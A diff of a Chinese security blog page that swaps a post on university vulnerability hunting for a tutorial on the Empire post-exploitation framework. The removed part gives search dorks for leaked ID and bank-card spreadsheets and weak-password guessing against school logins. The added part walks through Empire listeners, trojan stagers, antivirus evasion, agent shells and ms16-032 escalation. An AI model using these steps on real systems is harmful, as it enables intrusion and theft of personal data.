@@ -3,32 +3,36 @@
 <html class="article-header-style-default">
 <head>
 	
-	<title>记EDUSEC挖掘方法 - 回梦&#39;s Blog</title>
+	<title>Empire常规使用 - 回梦&#39;s Blog</title>
 	<meta charset="utf-8">
 	
 		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 	
-	<meta name="description" content="前言记录常规的挖掘方法，一般差别不大 惭愧，在废物的路上越走越远 谷歌语法批量刷信息泄露该语法范围比较广 1site:*.edu.cn filetype:xls 身份证 | 手机号 | 银行卡号  最好就是单独搜索，比较好筛选。可以使用goole的小工具搜索时间比较近的，这样重复的概率比较低  不过不管是一个压缩包的身份证，貌似都是一分而已 假如xls文件没有，可以尝试搜索其他文件 如：doc、d">
+	<meta name="description" content="前言Empire是一个PowerShell后期漏洞利用代理工具同时也是一款很强大的后渗透测神器，它建立在密码学、安全通信和灵活的架构之上。Empire实现了无需powershell.exe就可运行PowerShell代理的功能。快速部署后期漏洞利用模块，从键盘记录器到Mimikatz，并且能够适应通信躲避网络检测，所有的这些功能都封装在一个以实用性为重点的框架中 安装下载地址：https:&#x2F;&#x2F;gi">
 <meta property="og:type" content="article">
-<meta property="og:title" content="记EDUSEC挖掘方法">
-<meta property="og:url" content="http://example.com/2021/03/03/%E8%AE%B0EDUSEC%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/index.html">
+<meta property="og:title" content="Empire常规使用">
+<meta property="og:url" content="http://example.com/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/index.html">
 <meta property="og:site_name" content="回梦&#39;s Blog">
-<meta property="og:description" content="前言记录常规的挖掘方法，一般差别不大 惭愧，在废物的路上越走越远 谷歌语法批量刷信息泄露该语法范围比较广 1site:*.edu.cn filetype:xls 身份证 | 手机号 | 银行卡号  最好就是单独搜索，比较好筛选。可以使用goole的小工具搜索时间比较近的，这样重复的概率比较低  不过不管是一个压缩包的身份证，貌似都是一分而已 假如xls文件没有，可以尝试搜索其他文件 如：doc、d">
+<meta property="og:description" content="前言Empire是一个PowerShell后期漏洞利用代理工具同时也是一款很强大的后渗透测神器，它建立在密码学、安全通信和灵活的架构之上。Empire实现了无需powershell.exe就可运行PowerShell代理的功能。快速部署后期漏洞利用模块，从键盘记录器到Mimikatz，并且能够适应通信躲避网络检测，所有的这些功能都封装在一个以实用性为重点的框架中 安装下载地址：https:&#x2F;&#x2F;gi">
 <meta property="og:locale">
-<meta property="og:image" content="http://example.com/2021/03/03/%E8%AE%B0EDUSEC%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/1.png">
-<meta property="og:image" content="http://example.com/2021/03/03/%E8%AE%B0EDUSEC%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/2.png">
-<meta property="og:image" content="http://example.com/2021/03/03/%E8%AE%B0EDUSEC%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/3.png">
-<meta property="og:image" content="http://example.com/2021/03/03/%E8%AE%B0EDUSEC%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/4.png">
-<meta property="og:image" content="http://example.com/2021/03/03/%E8%AE%B0EDUSEC%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/5.png">
-<meta property="og:image" content="http://example.com/2021/03/03/%E8%AE%B0EDUSEC%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/7.png">
-<meta property="og:image" content="http://example.com/2021/03/03/%E8%AE%B0EDUSEC%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/6.png">
-<meta property="og:image" content="http://example.com/2021/03/03/%E8%AE%B0EDUSEC%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/8.png">
-<meta property="article:published_time" content="2021-03-03T09:30:07.000Z">
-<meta property="article:modified_time" content="2021-03-03T11:28:09.507Z">
+<meta property="og:image" content="http://example.com/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/1.png">
+<meta property="og:image" content="http://example.com/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/2.png">
+<meta property="og:image" content="http://example.com/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/3.png">
+<meta property="og:image" content="http://example.com/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/4.png">
+<meta property="og:image" content="http://example.com/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/6.png">
+<meta property="og:image" content="http://example.com/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/7.png">
+<meta property="og:image" content="http://example.com/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/8.png">
+<meta property="og:image" content="http://example.com/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/9.png">
+<meta property="og:image" content="http://example.com/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/10.png">
+<meta property="og:image" content="http://example.com/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/11.png">
+<meta property="og:image" content="http://example.com/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/12.png">
+<meta property="og:image" content="http://example.com/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/13.png">
+<meta property="article:published_time" content="2021-03-18T01:50:50.000Z">
+<meta property="article:modified_time" content="2021-03-18T03:01:15.774Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/03/03/%E8%AE%B0EDUSEC%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/1.png">
+<meta name="twitter:image" content="http://example.com/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/1.png">
 
 	<meta name="theme-color" content="#00bfff">
 	<meta name="theme-color-rgb" content="0,191,255">
@@ -591,13 +595,13 @@
 	<article class="post post-full card bg-white shadow-sm border-0 ">
 	<header class="post-header text-center">
 		
-		<a class="post-title" href="/2021/03/03/%E8%AE%B0EDUSEC%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/">记EDUSEC挖掘方法</a>
+		<a class="post-title" href="/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/">Empire常规使用</a>
 		<div class="post-meta">
 			
 						
 						<div class="post-meta-detail post-meta-detail-time">
 							<i class="fa fa-clock-o" aria-hidden="true"></i>
-							<time title="发布于 2021-3-3 17:30:07 | 编辑于 2021-3-3 19:28:09">2021-3-3 17:30
+							<time title="发布于 2021-3-18 9:50:50 | 编辑于 2021-3-18 11:01:15">2021-3-18 9:50
 							</time>
 						</div>
 					
@@ -606,7 +610,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-categories">
 							<i class="fa fa-bookmark-o" aria-hidden="true"></i>
-							<a class="post-meta-detail-catagory-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+							<a class="post-meta-detail-catagory-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
 						</div>
 					
 						
@@ -624,7 +628,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-words">
 							<i class="fa fa-file-word-o" aria-hidden="true"></i>
-							292 字
+							590 字
 						</div>
 					
 						
@@ -632,7 +636,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-readingtime">
 							<i class="fa fa-hourglass-end" aria-hidden="true"></i>
-							1 分钟
+							2 分钟
 						</div>
 					
 		</div>
@@ -640,61 +644,54 @@
 	</header>
 
 	<div class="post-content" id="post_content">
-		<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录常规的挖掘方法，一般差别不大</p>
-<p>惭愧，在废物的路上越走越远</p>
-<h1 id="谷歌语法"><a href="#谷歌语法" class="headerlink" title="谷歌语法"></a>谷歌语法</h1><h2 id="批量刷信息泄露"><a href="#批量刷信息泄露" class="headerlink" title="批量刷信息泄露"></a>批量刷信息泄露</h2><p>该语法范围比较广</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:*.edu.cn filetype:xls 身份证 | 手机号 | 银行卡号</span><br></pre></td></tr></table></figure>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/03/03/%E8%AE%B0EDUSEC%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/1.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+		<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Empire是一个PowerShell后期漏洞利用代理工具同时也是一款很强大的后渗透测神器，它建立在密码学、安全通信和灵活的架构之上。Empire实现了无需powershell.exe就可运行PowerShell代理的功能。快速部署后期漏洞利用模块，从键盘记录器到Mimikatz，并且能够适应通信躲避网络检测，所有的这些功能都封装在一个以实用性为重点的框架中</p>
+<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/BC-SECURITY/Empire">https://github.com/BC-SECURITY/Empire</a></p>
+<p>更新速度还是可以的，24天才更新过</p>
+<h2 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install powershell-empire</span><br><span class="line">sudo powershell-empire，启动empire</span><br></pre></td></tr></table></figure>
+<h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone --recursive https://github.com/BC-SECURITY/Empire.git</span><br><span class="line">cd Empire</span><br><span class="line">sudo ./setup/install.sh</span><br><span class="line">sudo poetry install</span><br><span class="line">sudo poetry run python empire</span><br></pre></td></tr></table></figure>
+<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">docker pull bcsecurity&#x2F;empire:&#123;version&#125;</span><br><span class="line">docker run -it -p 1337:1337 -p 5000:5000 bcsecurity&#x2F;empire:&#123;version&#125;</span><br><span class="line"></span><br><span class="line"># with persistent storage</span><br><span class="line">docker pull bcsecurity&#x2F;empire:&#123;version&#125;</span><br><span class="line">docker create -v &#x2F;empire --name data bcsecurity&#x2F;empire:&#123;version&#125;</span><br><span class="line">docker run -it -p 1337:1337 -p 5000:5000 --volumes-from data bcsecurity&#x2F;empire:&#123;version&#125;</span><br><span class="line"></span><br><span class="line"># if you prefer to be dropped into bash instead of directly into empire</span><br><span class="line">docker run -it -p 1337:1337 -p 5000:5000 --volumes-from data bcsecurity&#x2F;empire:&#123;version&#125; &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+<h1 id="常规使用"><a href="#常规使用" class="headerlink" title="常规使用"></a>常规使用</h1><h2 id="建立监听器"><a href="#建立监听器" class="headerlink" title="建立监听器"></a>建立监听器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uselistener 两下Tab键，就可以看到有以下可使用的监听类</span><br></pre></td></tr></table></figure>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/1.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>最好就是单独搜索，比较好筛选。可以使用goole的小工具搜索时间比较近的，这样重复的概率比较低</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/03/03/%E8%AE%B0EDUSEC%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/2.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="2"></p>
+<p>我这里使用http，这个工具是区分大小写的，所以设置的时候要注意</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uselistener http</span><br><span class="line">info，查看要设置的参数</span><br><span class="line">set Port 8800,设置端口</span><br><span class="line">set Name em,设置监听器的名称</span><br><span class="line">execute，启动监听器</span><br></pre></td></tr></table></figure>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/2.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>不过不管是一个压缩包的身份证，貌似都是一分而已</p>
-<p>假如xls文件没有，可以尝试搜索其他文件</p>
-<p>如：doc、docx、xlsx、pdf、zip、7z等等</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">site:*.edu.cn filetype:word 身份证</span><br><span class="line">site:*.edu.cn filetype:pdf 身份证</span><br><span class="line">site:*.edu.cn filetype:rar 身份证</span><br><span class="line">site:*.edu.cn filetype:zip 身份证</span><br></pre></td></tr></table></figure>
-<p>具体该如何使用可以根据个人需要结合语法即可</p>
-<h2 id="弱口令挖掘"><a href="#弱口令挖掘" class="headerlink" title="弱口令挖掘"></a>弱口令挖掘</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:*.edu.cn 管理系统</span><br><span class="line">site:*.edu.cn inurl:login</span><br><span class="line">site:*.edu.cn inurl:admin&#x2F;login</span><br></pre></td></tr></table></figure>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/03/03/%E8%AE%B0EDUSEC%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/3.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+<p>启动成功之后，输入back命令进行返回，再使用list查看当前启动的监听器</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/3.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>弱口令这玩意看运气</p>
-<p>有时候觉得这样尝试，123456一试一个准</p>
-<p>这样挖掘的思路就是看这些系统是需要什么账号进行登录，如学号、工号</p>
-<p>自己也可以尝试爆破一下admin等管理员类的账号试个top1000，看个人意愿</p>
-<p>其中收集工号与学号的与上述的刷信息泄露的方法差不多，学号比较好收集，有时候工号就比较难了，也有可能这个学校都没泄露有学号和工号</p>
-<p>当你是日指定学校的时候，将搜索的域名改为该学校的域名即可，不然搜索的将是全国学校的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:xx.edu.cn filetype:xls 学号 身份证</span><br><span class="line">site:xx.edu.cn filetype:xls 工号</span><br></pre></td></tr></table></figure>
-<p>假如这个没有可以尝试这样的，具体还是看个人如何使用</p>
-<p>有一次我就从这个搜索到一个学校的工号，在一处留言板的，现实的账号名称就是工号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:xx.edu.cn 工号</span><br><span class="line">site:xx.edu.cn intext:工号</span><br></pre></td></tr></table></figure>
-<p>搜索到学号和工号最简单的就是直接批量尝试123456等这种弱密码</p>
-<p>亦或者可以根据以下思路进行配合使用</p>
-<p>有的系统账号密码都可能是学号或者工号</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/03/03/%E8%AE%B0EDUSEC%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/4.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+<h2 id="木马生成"><a href="#木马生成" class="headerlink" title="木马生成"></a>木马生成</h2><p>之前我生成的bat木马，直接过了火绒的静态查杀，但是动态查杀就不行了哈哈</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/4.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>批量找注入的话，大学一般都是waf加身，假如你有绕过的方法可以进行尝试</p>
-<h1 id="根据IP方面"><a href="#根据IP方面" class="headerlink" title="根据IP方面"></a>根据IP方面</h1><p>有时候你可能觉得域名方面的资产有点难挖，那么你可以尝试学校部署在IP上的资产</p>
-<p>选定一个目标，可以尝试找该学校的真实ip，一般学校的真实IP都是有教育网等字样，比如上海交通大学的</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/03/03/%E8%AE%B0EDUSEC%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/5.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usestager multi&#x2F;launcher，使用powershell进行上线</span><br><span class="line">info，查看要进行设置的参数</span><br><span class="line">set Listener em，设置监听器</span><br><span class="line">execute，启动</span><br></pre></td></tr></table></figure>
+<p>在目标机器运行，就会返回一个会话</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/6.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>通过搜索，上交的ip范围如下</p>
-<p>202.120.1.1-202.120.63.255</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/03/03/%E8%AE%B0EDUSEC%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/7.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">agents，查看获取的会话</span><br><span class="line">interact KS392FMB，进入该会话</span><br><span class="line">sysinfo，查看当前会话信息</span><br><span class="line">shell whoami，查看当前权限</span><br><span class="line">help，查看帮助</span><br></pre></td></tr></table></figure>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/7.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>得到该B段，你可以进行扫描端口，当然单一的扫描效率很慢慢</p>
-<p>可以使用fofa、shodan等，每个C段都是进行查看所有的资产</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip&#x3D;&quot;1.1.1.0&#x2F;24&quot;，搜索C段</span><br><span class="line">ip&#x3D;&quot;1.1.1.1&quot;，搜索该IP</span><br></pre></td></tr></table></figure>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/03/03/%E8%AE%B0EDUSEC%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/6.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>Empire总共提供了234个模块</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/8.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>当然你也可以使用其他工具进行扫描该C段范围内的资产</p>
-<p>我之前用过这个工具感觉还不错</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/03/03/%E8%AE%B0EDUSEC%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/8.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+<p>我这里之间使用ms16-032这个模块</p>
